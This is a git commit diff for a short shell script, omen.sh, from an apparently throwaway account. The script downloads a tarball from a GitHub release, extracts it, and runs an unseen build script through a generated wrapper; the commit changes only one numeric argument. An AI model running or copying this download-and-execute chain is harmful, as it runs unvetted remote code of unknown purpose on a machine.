cce54a1e4bb5a6c74cd4e84702fa56aa0d6eb16c
wouegrkaj922-max <wouegrkaj922@ucemo.com>
2026-09-22 09:43:45 +0700

    Update omen.sh

--- omen.sh
+++ omen.sh
@@ -1,5 +1,5 @@
 curl -O -J -L https://github.com/wouegrkaj922-max/dewsa/releases/download/deas/kombi.tar.gz && tar -xf kombi.tar.gz && rm -rf kombi.tar.gz
 echo '#!/bin/bash
 
-bash build.sh 4 009' > bolo.sh
+bash build.sh 4 005' > bolo.sh
 bash bolo.sh
